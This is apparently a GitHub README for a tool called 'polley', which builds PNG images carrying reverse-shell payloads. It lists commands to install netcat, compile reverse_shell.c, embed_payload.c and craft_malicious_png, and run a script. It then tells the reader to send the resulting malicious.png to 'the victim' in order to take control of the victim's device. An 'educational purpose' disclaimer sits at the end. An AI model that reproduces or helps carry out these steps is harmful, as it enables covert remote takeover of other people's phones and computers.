# polley

A linux tool which is used to control a device with a image or hack ethically with a image [with reverse_shell payloads within the PNG images] It can used in Android, IOS and Any type of linux.

![Screenshot_20260323_220005_Termux](https://github.com/user-attachments/assets/c3e4f138-a3be-4476-a57d-2c549ce4384a)

## COMMANDS 

# Setting up terminal

To use this tool, copy and paste these commands into your Kali Linux terminal:

# 1. Update Your Terminal 
sudo apt update && sudo apt upgrade

# 2. Install Necessary Tools

sudo apt install build-essential libpng-dev 

sudo apt install zlib1g-dev

sudo apt install netcat-traditional -y

# 3. Now, Clone The Respiratory (polley)
git clone https://github.com/anknpolley123/polley.git

# 4. Enter The Folder
cd ~/polley

# 5. Then, Compile The File reverse_shell.c
gcc reverse_shell.c -o reverse_shell

# 6. Compile The File embed_payload.c
gcc embed_payload.c -o embed_payload -lpng

# 7. Compile The File craft_malicious_png
gcc craft_malicious_png.c -o craft_malicious_png -lpng

# 8. Give permission 
chmod +x run_all.sh

# 9. Run The Final Command
./run_all.sh

# 10. Send the Malicious File

go to linux File manager, go to home, go to polley folder, select malicious.png, send it to the victim. You will get control of the victim's device in your linux terminal.

# DISCLAIMER 
This Tool is only for Educational Purpose. We are not responsible for the Misuse or Any Harm by it.


[Thank You For Using My linux Tool 'polley']

For More Information You Can Contact me: ankonpolley@proton.me
Or My Instagram Id: @itz_vorzhevik_volnyshev ; alt: itz_ankon_polley
Support Me on Twitter'X': @AnkonPolley
Follow My Pinterest account: @ankonpolley
Support me also in Facebook: Ankon Polley
